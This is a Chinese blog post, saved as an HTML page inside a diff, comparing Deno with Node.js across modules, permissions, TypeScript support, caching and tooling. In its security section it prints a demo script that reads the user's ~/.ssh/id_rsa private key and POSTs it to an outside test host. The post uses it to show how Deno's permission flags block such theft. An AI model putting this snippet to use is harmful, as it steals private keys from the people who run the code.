@@ -1,0 +1,854 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>了解xiadeno，与node的区别是什么？ - 默默默默燃</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一枚前端搬砖队队员的记录册,Deno VS Node
+
+
+不同点
+Node
+Deno
+
+
+
+
+API 引用方式
+模块导入
+全局对象
+
+
+模块系统
+CommonJS &amp;amp; 新版 node 实验性 ES Module
+ES ,"> 
+    <meta name="author" content="张白告丶"> 
+    <link rel="alternative" href="atom.xml" title="默默默默燃" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">默默默默燃</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://zhanghao-web.github.io">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">了解xiadeno，与node的区别是什么？</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/Deno"><b>「
+                    </b>DENO<b> 」</b></a>
+                
+                May 17, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/05/17/Deno/%E4%BA%86%E8%A7%A3%E4%B8%8Bdeno%EF%BC%8C%E4%B8%8Enode%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/" title="了解xiadeno，与node的区别是什么？" class="">了解xiadeno，与node的区别是什么？</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    15k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    13 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/Deno/" rel="tag">Deno</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h1 id="Deno-VS-Node"><a href="#Deno-VS-Node" class="headerlink" title="Deno VS Node"></a>Deno VS Node</h1><table>
+<thead>
+<tr>
+<th>不同点</th>
+<th style="text-align:right">Node</th>
+<th style="text-align:center">Deno</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>API 引用方式</td>
+<td style="text-align:right">模块导入</td>
+<td style="text-align:center">全局对象</td>
+</tr>
+<tr>
+<td>模块系统</td>
+<td style="text-align:right">CommonJS &amp; 新版 node 实验性 ES Module</td>
+<td style="text-align:center">ES Module 浏览器实现</td>
+</tr>
+<tr>
+<td>安全</td>
+<td style="text-align:right">无安全限制</td>
+<td style="text-align:center">默认安全</td>
+</tr>
+<tr>
+<td>Typescript</td>
+<td style="text-align:right">第三方，如通过 ts-node 支持</td>
+<td style="text-align:center">原生支持</td>
+</tr>
+<tr>
+<td>包管理</td>
+<td style="text-align:right">npm + node_modules</td>
+<td style="text-align:center">原生支持</td>
+</tr>
+<tr>
+<td>异步操作</td>
+<td style="text-align:right">回调</td>
+<td style="text-align:center">Promise</td>
+</tr>
+<tr>
+<td>包分发</td>
+<td style="text-align:right">中心化 npmjs.com</td>
+<td style="text-align:center">去中心化 import url</td>
+</tr>
+<tr>
+<td>入口</td>
+<td style="text-align:right">package.json 配置</td>
+<td style="text-align:center">import url 直接引入</td>
+</tr>
+<tr>
+<td>打包、测试、格式化</td>
+<td style="text-align:right">第三方如 eslint、gulp、webpack、babel 等</td>
+<td style="text-align:center">原生支持</td>
+</tr>
+</tbody>
+</table>
+<h2 id="1-内置-API-引用方式不同"><a href="#1-内置-API-引用方式不同" class="headerlink" title="1.内置 API 引用方式不同"></a>1.内置 API 引用方式不同</h2><p><strong>node 模块导入</strong></p>
+<p>node 内置 API 通过模块导入的方式引用，例如：</p>
+<pre><code class="js">const fs = require(&quot;fs&quot;);
+fs.readFileSync(&quot;./data.txt&quot;);
+</code></pre>
+<p><strong>deno 全局对象</strong></p>
+<p>而 deno 则是一个全局对象 Deno 的属性和方法：</p>
+<pre><code class="js">Deno.readFileSync(&quot;./data.txt&quot;);
+具体 deno 有哪些方法，我们可以通过 repl 看一下：
+</code></pre>
+<pre><code class="js">deno # 或 deno repl
+</code></pre>
+<p>进入 <code>repl</code> 后，输入 Deno 回车，我们可以看到：</p>
+<pre><code class="json">{
+ Buffer: [Function: Buffer],
+ readAll: [AsyncFunction: readAll],
+ readAllSync: [Function: readAllSync],
+ writeAll: [AsyncFunction: writeAll],
+ writeAllSync: [Function: writeAllSync],
+ # .....
+}
+</code></pre>
+<p>这种处理的方式好处是<strong>简单、方便</strong>，坏处是<strong>没有分类</strong>，想查找忘记的 API 比较困难。总体来说见仁见智。</p>
+<h2 id="2-模块系统"><a href="#2-模块系统" class="headerlink" title="2.模块系统"></a>2.模块系统</h2><p>我们再来看一下模块系统，这也是 deno 和 node <strong>差别最大的地方</strong>，同样也是 deno 和 node 不兼容的地方。</p>
+<p><strong>node CommonJS 规范</strong><br>我们都知道 node 采用的是 CommonJS 规范，而 deno 则是采用的 ES Module 的浏览器实现，那么我们首先来认识一下：</p>
+<p><strong>ES Module 的浏览器实现</strong><br>具体关于 ES Module 想必大家都早已熟知，但其浏览器实现可能大家还不是很熟悉，所以我们先看一下其浏览器实现：</p>
+<pre><code class="html">&lt;body&gt;
+  &lt;!-- 注意这里一定要加上 type=&quot;module&quot; --&gt;
+  &lt;script type=&quot;module&quot;&gt;
+    // 从 URL 导入
+    import Vue from &quot;https://unpkg.com/vue@2.6.11/dist/vue.esm.browser.js&quot;;
+    // 从相对路径导入
+    import * as utils from &quot;./utils.js&quot;;
+    // 从绝对路径导入
+    import &quot;/index.js&quot;;
+
+    // 不支持
+    import foo from &quot;foo.js&quot;;
+    import bar from &quot;bar/index.js&quot;;
+    import zoo from &quot;./index&quot;; // 没有 .js 后缀
+  &lt;/script&gt;
+&lt;/body&gt;
+</code></pre>
+<p><strong>deno 的模块规范</strong><br>deno 完全遵循 es module 浏览器实现，所以 deno 也是如此：</p>
+<pre><code class="js">// 支持
+import * as fs from &quot;https://deno.land/std/fs/mod.ts&quot;;
+import { deepCopy } from &quot;./deepCopy.js&quot;;
+import foo from &quot;/foo.ts&quot;;
+
+// 不支持
+import foo from &quot;foo.ts&quot;;
+import bar from &quot;./bar&quot;; // 必须指定扩展名\
+</code></pre>
+<p>我们发现其和我们平常在 webpack 或者 ts 使用 es module 最大的不同：</p>
+<ul>
+<li><p>可以通过 import url 直接引用线上资源；</p>
+</li>
+<li><p>资源不可省略扩展名和文件名。</p>
+</li>
+</ul>
+<p>关于第 1 点，争议非常大，有人很看好，觉得极大的扩展了 deno 库的范围；有人则不太看好，觉得国内网速的原因，并不实用。</p>
+<h2 id="3-安全"><a href="#3-安全" class="headerlink" title="3.安全"></a>3.安全</h2><p>如果模块规范是 node 和 deno 最大的不同，那么对安全的处理，则是另外一个让人摸不着头脑的地方。</p>
+<p><strong>模拟盗号</strong></p>
+<p>在介绍之前我们先思考一下这个场景会不会出现：</p>
+<p>我做了一个基于命令行的一键上网工具 <code>breakwall</code>，每月 1 个 G 免费流量，然后将压缩后的 JS 代码发布到 npm 上，然后后在各种渠道宣传一波。</p>
+<p>羊毛党兴高彩烈的 <code>cnpm install -g breakwall</code>，然后每次使用的时候，我偷偷的将诸位的 ssh 密钥和各种能偷的文档及图片偷偷上传到我的服务器，在设定期限到期后，删除电脑上资料，留下一句拿钱换资料，仅支持比特币。</p>
+<p><strong>默认安全的 deno</strong></p>
+<p>如果你觉得以上情况有可能出现，则会觉得下面的功能很实用。我们先用 deno 执行以下代码：</p>
+<pre><code class="js">// index.js
+let rsa = Deno.readFileSync(Deno.dir(&quot;home&quot;) + &quot;/.ssh/id_rsa&quot;);
+
+rsa = new TextDecoder().decode(rsa);
+
+fetch(&quot;http://jsonplaceholder.typicode.com/posts/1&quot;, {
+  method: &quot;POST&quot;,
+  body: JSON.stringify(rsa)
+})
+  .then((res) =&gt; res.json())
+  .then((res) =&gt; console.log(&quot;密钥发送成功，嘿嘿嘿😜&quot;));
+
+console.log(&quot;start breakwall...&quot;);
+</code></pre>
+<blockquote>
+<p>PS: –unstable 是由于 Deno.dir API 不稳定</p>
+</blockquote>
+<pre><code class="js"> deno run --unstable index.js
+</code></pre>
+<p>我们将会得到如下报错信息：</p>
+<pre><code class="js">&gt; deno run --unstable  index.js
+error: Uncaught PermissionDenied: access to environment variables, run again with the --allow-env flag
+    ...
+</code></pre>
+<p>意思就是权限异常，需要访问环境变量，需要加上 <code>--allow-env</code>，我们加上这个参数再试一下。</p>
+<pre><code class="js"> deno run --unstable --allow-env index.js
+error: Uncaught PermissionDenied: read access to &quot;/Users/zhangchaojie/.ssh/id_rsa&quot;, run again with the --allow-read flag
+    ...
+</code></pre>
+<p>如此反复，还需加上 <code>--allow-read</code>、<code>--allow-net</code> ，最终的结果是：</p>
+<pre><code class="js">&gt; deno run --unstable --allow-env --allow-read --allow-net  index.js
+start breakwall...
+密钥发送成功，嘿嘿嘿😜
+</code></pre>
+<p>经过一番折腾，总算是发送成功了，要想盗取密钥实属不易。</p>
+<p><strong>白名单</strong></p>
+<p>那有人就说了，如果我的应用确实需要访问网络和文件，但是有不想让它访问 .ssh 文件有没有办法？</p>
+<p>当然有了，我们可以给 <code>--allow-read</code> 和 <code>--allow-net</code> 指定白名单，名单之外都不可访问，例如：</p>
+<pre><code class="js">&gt; deno run --unstable --allow-env --allow-read --allow-net=https://www.baidu.com  index.js
+start breakwall...
+error: Uncaught PermissionDenied: network access to &quot;http://jsonplaceholder.typicode.com/posts/1&quot;, run again with the --allow-net flag
+    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)
+    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)
+    at async fetch ($deno$/web/fetch.ts:591:27)
+</code></pre>
+<p><strong>简化参数</strong></p>
+<p>如果确认是没问题，或者是自己开发软件时，图个方便，可以直接使用 -A 或 –allow-all 参数允许所有权限：</p>
+<pre><code class="js">&gt; deno -A --unstable index.js
+start breakwall...
+密钥发送成功，嘿嘿嘿😜
+</code></pre>
+<p>安全这方面见仁见智，有人觉得是多余，有人觉得很好用，极大的增强了安全性。如果你属于觉得这个功能多余的，可以 deno run -A xxx 即可。</p>
+<h2 id="4-兼容浏览器-API"><a href="#4-兼容浏览器-API" class="headerlink" title="4.兼容浏览器 API"></a>4.兼容浏览器 API</h2><p>关于为什么，我举个栗子大家就明白了：在设计 node 之处，关于输出函数本来叫 <code>print</code> 之类的，后来有人提议为什么不叫 <code>console.log</code>，ry 觉得挺不错，于是就接纳了意见。</p>
+<p>但是，这个设计并不是刻意为之，而 deno 的设计则可以为之，通过与浏览器 API 保持一致，来减少大家的认知。</p>
+<p><strong>怎么兼容浏览器 API</strong></p>
+<blockquote>
+<p>概念上兼容</p>
+<ul>
+<li>模块系统，从上面介绍看出 deno 是完全遵循浏览器实现的；</li>
+</ul>
+</blockquote>
+<ul>
+<li><p>默认安全，当然也不是自己创造的概念，w3c 早已做出浏览器权限的规定，我们在做小程序的时候尤为明显，需要获取各种权限；</p>
+</li>
+<li><p>对于异步操作返回 Promise；</p>
+</li>
+<li><p>使用 <code>ArrayBuffer</code> 处理二进制；</p>
+</li>
+</ul>
+<blockquote>
+<p>存在 window 全局变量</p>
+</blockquote>
+<p><code>console.log(window === this, window === self, window === globalThis);</code></p>
+<blockquote>
+<p>实现了 WindowOrWorkerGlobalScope 的全部方法</p>
+</blockquote>
+<p>具体方法列表，我们可以参考：<code>lib.deno.shared_globals.d.ts</code> 和 <code>lib.deno.window.d.ts</code></p>
+<pre><code class="js">// 请求方法
+fetch(&quot;https://baidu.com&quot;);
+
+// base64 转化
+let encodedData = btoa(&quot;Hello, world&quot;); // 编码
+let decodedData = atob(encodedData); // 解码
+
+// 微任务
+queueMicrotask(() =&gt; {
+  console.log(123);
+});
+</code></pre>
+<blockquote>
+<p>大趋势</p>
+</blockquote>
+<p>总体而言，如果服务端和浏览器端存在相同概念，deno 就不会创造新的概念。这一点其实 node 也在做，新的 node 14.0 CHANGELOG 就也提及要实现 Universal JavaScript 和 Spec compliance and Web Compatibility的思想，所以这点大家应该都会接受吧，毕竟大势所趋趋势。</p>
+<h2 id="5-支持-Typescript"><a href="#5-支持-Typescript" class="headerlink" title="5.支持 Typescript"></a>5.支持 Typescript</h2><p>不管你喜欢与否，2020 年了，必须学习 TS 了（起码在面试的时候是亮点）。学完之后你才会明白王境泽定律真的无处不在。</p>
+<pre><code class="js">// index.ts
+let str: string = &quot;王境泽定律&quot;;
+str = 132;
+&gt; deno run index.ts
+error TS2322: Type &#39;123&#39; is not assignable to type &#39;string&#39;.
+
+► file:///Users/zhangchaojie/Desktop/index.ts:2:1
+
+2 str = 123
+  ~~~
+</code></pre>
+<h2 id="6-去-node-modules"><a href="#6-去-node-modules" class="headerlink" title="6.去 node_modules"></a>6.去 node_modules</h2><p>deno 没有 <code>node_modules</code>，那么它是怎么进行包管理的呢？我们先看下面的例子</p>
+<pre><code class="js">// index.js
+import { white, bgRed } from &quot;https://deno.land/std/fmt/colors.ts&quot;;
+
+console.log(bgRed(white(&quot;hello world!&quot;)));
+&gt; deno run index.js
+Download https://deno.land/std/fmt/colors.ts
+Compile https://deno.land/std/fmt/colors.ts
+hello world!
+</code></pre>
+<p>我们看到其有 Download 和 Compile 两个步骤，我们会产生几个疑问：</p>
+<blockquote>
+<p>1、每次执行都要下载吗？</p>
+</blockquote>
+<p>解：我们只需要再执行一次就能明白，不需要每次下载。</p>
+<pre><code class="js">&gt; deno run index.js
+hello world!
+</code></pre>
+<blockquote>
+<p>2、Download 和 Compile 的文件在哪里呢？</p>
+</blockquote>
+<p>解：我们会发现，当前执行的目录，并没有 Download 和 Compile 文件，那文件放在哪里呢，我们首先来看一下 deno –help 命令：</p>
+<pre><code class="js">&gt; deno --help
+SUBCOMMANDS:
+# ...
+info           Show info about cache or info related to source file
+
+# ...
+ENVIRONMENT VARIABLES:
+    DENO_DIR   Set deno&#39;s base directory (defaults to $HOME/.deno)
+</code></pre>
+<p>deno info 命令展示了依赖关系，类似 package.json。</p>
+<pre><code class="js">&gt; deno info index.js
+local: /Users/zhangchaojie/Desktop/index.js
+type: JavaScript
+deps:
+file:///Users/zhangchaojie/Desktop/index.js
+  └── https://deno.land/std/fmt/colors.ts
+</code></pre>
+<p>DENO_DIR 则为实际的安装和编译目录，相当于 node_modules，默认为 $HOME/.deno（命令提示是这样的，但实际需要指定一下环境变量 <code>export DENO_DIR=$HOME/.deno）</code>，我们看一下：</p>
+<pre><code class="js">&gt; tree $HOME/.deno
+/Users/zhangchaojie/.deno
+├── deps
+│   └── https
+│       └── deno.land
+│           ├── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935
+│           └── 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935.metadata.json
+└── gen
+    └── https
+        └── deno.land
+            └── std
+                └── fmt
+                    ├── colors.ts.js
+                    ├── colors.ts.js.map
+                    └── colors.ts.meta
+
+8 directories, 5 files
+</code></pre>
+<blockquote>
+<p>3、没网络了怎么办？</p>
+</blockquote>
+<p>我们有些场景是将本地写好的代码部署到没有网络的服务器，那么当执行 deno run xxx 时，就是提示 error sending request。</p>
+<p>解：将上面的缓存目录内容，直接拷贝到服务器并指定环境变量到其目录即可。</p>
+<blockquote>
+<p>4、依赖代码更新了怎么办？</p>
+</blockquote>
+<p>解：当依赖模块更新时，我们可以通过 –reload 进行更新缓存，例如：</p>
+<p><code>&gt; deno run --reload index.js</code><br>我们还可以通过白名单的方式，只更新部分依赖。例如：</p>
+<p><code>&gt; deno run --reload=https://deno.land index.js</code></p>
+<blockquote>
+<p>5、仅缓存依赖，不执行代码有办法吗？</p>
+</blockquote>
+<p>解：有的，我们可以通过 deno cache index.js 进行依赖缓存。</p>
+<blockquote>
+<p>6、多版本怎么处理？</p>
+</blockquote>
+<p>解：暂时没有好的解决方案，只能通过 git tag 的方式区分版本。</p>
+<h2 id="7-标准模块-与-node-API-兼容"><a href="#7-标准模块-与-node-API-兼容" class="headerlink" title="7.标准模块 与 node API 兼容"></a>7.标准模块 与 node API 兼容</h2><p>我们通过第 1 点可以看到，其实 deno 的 API 相对于 node 其实是少一些的，通过其文件大小也能看出来：</p>
+<pre><code class="js">&gt; ll /usr/local/bin/node /Users/zhangchaojie/.local/bin/deno
+-rwxr-xr-x  1   42M   /Users/zhangchaojie/.local/bin/deno
+-rwxr-xr-x  1   70M   /usr/local/bin/node
+</code></pre>
+<p>那这些少的 API 只能自己写或者求助于社区吗？</p>
+<p>deno 对于自身相对于 node 少的和社区中常用的功能，提供了标准模块，其特点是不依赖非标准模块的内容，达到社区内的模块引用最后都收敛于标准模块的效果。例如：</p>
+<pre><code class="js">// 类似 node 中 chalk 包
+import { bgRed, white } from &quot;https://deno.land/std/fmt/colors.ts&quot;;
+
+// 类似 node 中的 uuid 包
+import { v4 } from &quot;https://deno.land/std/uuid/mod.ts&quot;;
+</code></pre>
+<p>同时为了对 node 用户友好，提供了 node API 的兼容</p>
+<pre><code class="js">import * as path from &quot;https://deno.land/std/node/path.ts&quot;;
+import * as fs from &quot;https://deno.land/std/node/fs.ts&quot;;
+
+console.log(path.resolve(&#39;./&#39;, &#39;./test&#39;))
+</code></pre>
+<p>所以，大家在为 deno 社区做贡献的时候，首先要看一下标准模块有没有提供类似的功能，如果已经提供了可以进行引用。</p>
+<h2 id="8-异步操作"><a href="#8-异步操作" class="headerlink" title="8.异步操作"></a>8.异步操作</h2><blockquote>
+<p>根据 ry 自己是说法，在设计 node 是有人提议 Promise 处理回调，但是他没听，用他自己的话说就是愚蠢的拒绝了。</p>
+</blockquote>
+<p><strong>node 用回调的方式处理异步操作、deno 则选择用 Promise</strong></p>
+<pre><code class="js">// node 方式
+const fs = require(&quot;fs&quot;);
+fs.readFile(&quot;./data.txt&quot;, (err, data) =&gt; {
+  if (err) throw err;
+  console.log(data);
+});
+</code></pre>
+<p>另外 deno 支持 top-level-await，所以以上读取文件的代码可以为：</p>
+<pre><code class="js">// deno 方式
+const data = await Deno.readFile(&quot;./data.txt&quot;);
+console.log(data);
+</code></pre>
+<p>node 关于这方面也在一直改进，例如社区上很多 <code>promisify</code> 解决方案，通过包裹一层函数，实现目的。例如：</p>
+<pre><code class="js">// node API promisify
+const { promisify } = require(&quot;es6-promisify&quot;);
+const fs = require(&quot;fs&quot;);
+
+// 没有 top-level-await，只能包一层
+async function main() {
+  const readFile = promisify(fs.readFile);
+  const data = await readFile(&quot;./data.txt&quot;);
+  console.log(data);
+}
+
+main();
+</code></pre>
+<h2 id="9-单文件分发"><a href="#9-单文件分发" class="headerlink" title="9.单文件分发"></a>9.单文件分发</h2><p>我们知道 npm 包必须有 <code>package.json</code> 文件，里面不仅需要指明 main 或 module 或 browser 等字段来标明入口文件，还需要指明 <code>name 、license 、description</code> 等字段来说明这个包。</p>
+<p>ry 觉得这些字段扰乱了开发者的视听，所以在 deno 中，其模块不需要任何配置文件，直接是 import url 的形式。</p>
+<h2 id="10-去中心化仓库"><a href="#10-去中心化仓库" class="headerlink" title="10.去中心化仓库"></a>10.去中心化仓库</h2><p>对于 <code>www.npmjs.com</code> 我们肯定都不陌生，它是推动 node 蓬勃发展的重要支点。但作者认为它是中心化仓库，违背了互联网去中心化原则。</p>
+<p>所以 deno 并没有一个像 npmjs.com 的仓库，通过 import url 的方式将互联网任何一处的代码都可以引用。</p>
+<p>PS：deno 其实是有个基于 <code>GitHub</code> 的第三方模块集合。</p>
+<h2 id="11-去开发依赖"><a href="#11-去开发依赖" class="headerlink" title="11.去开发依赖"></a>11.去开发依赖</h2><p>我们在写一个 node 库或者工具时，开发依赖是少不了的，例如 babel 做转化和打包、jest 做测试、prettier 做代码格式化、eslint 做代码格式校检、gulp 或者 webpack 做构建等等，让我们在开发前就搞得筋疲力尽。</p>
+<blockquote>
+<p>deno 通过内置了一些工具，解决上述问题。</p>
+</blockquote>
+<ul>
+<li><p><code>deno bundle</code>：打包命令，用来替换 babel、gulp 一类工具: 例如：deno bundle ./mod.ts；</p>
+</li>
+<li><p><code>deno fmt</code>：格式化命令，用来替换 prettier 一类工具，例如：deno fmt ./mod.ts；</p>
+</li>
+<li><p><code>deno test</code>：运行测试代码，用来替换 jest 一类工具，例如 deno test ./test.ts；</p>
+</li>
+<li><p><code>deno lint</code>：代码校检（暂未实现），用来替换 eslint 一类工具，例如：deno lint ./mod.ts。</p>
+</li>
+</ul>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>就像小时候一直幻想的炸弹始终没能炸了学校，技（轮）术（子）的进（制）步（造）一直也未停止过。不论我们学的动或者学不动，技术就在那里，不以人的意志为转移。</p>
+<p>至于 deno 能不能火，我个人觉得起码一两年内不会有太大反响，之后和 node 的关系有可能像 Vue 和 react，有人喜欢用 deno，觉得比 node 好一万倍，有人则喜欢 node ，觉得 node 还能再战 500 年。至于最终学不学还看自己。</p>
+<p><a href="https://juejin.im/post/5ebcabb2e51d454da74185a9" target="_blank" rel="noopener">20 分钟入门 deno</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d='undefined'
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>张白告丶</p>
+                    <span>Think like an artist, develop like an artisan</span>
+                    <dl>
+                        <dd><a href="https://github.com/zhanghao-web" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">162 <p>Articles</p></a></li>
+                    <li><a href="/categories">26 <p>Categories</p></a></li>
+                    <li><a href="/tags">53 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Deno-VS-Node"><span class="toc-number">1.</span> <span class="toc-text">Deno VS Node</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-内置-API-引用方式不同"><span class="toc-number">1.1.</span> <span class="toc-text">1.内置 API 引用方式不同</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-模块系统"><span class="toc-number">1.2.</span> <span class="toc-text">2.模块系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-安全"><span class="toc-number">1.3.</span> <span class="toc-text">3.安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-兼容浏览器-API"><span class="toc-number">1.4.</span> <span class="toc-text">4.兼容浏览器 API</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-支持-Typescript"><span class="toc-number">1.5.</span> <span class="toc-text">5.支持 Typescript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-去-node-modules"><span class="toc-number">1.6.</span> <span class="toc-text">6.去 node_modules</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-标准模块-与-node-API-兼容"><span class="toc-number">1.7.</span> <span class="toc-text">7.标准模块 与 node API 兼容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-异步操作"><span class="toc-number">1.8.</span> <span class="toc-text">8.异步操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-单文件分发"><span class="toc-number">1.9.</span> <span class="toc-text">9.单文件分发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-去中心化仓库"><span class="toc-number">1.10.</span> <span class="toc-text">10.去中心化仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-去开发依赖"><span class="toc-number">1.11.</span> <span class="toc-text">11.去开发依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">1.12.</span> <span class="toc-text">后记</span></a></li></ol></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            张白告丶
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
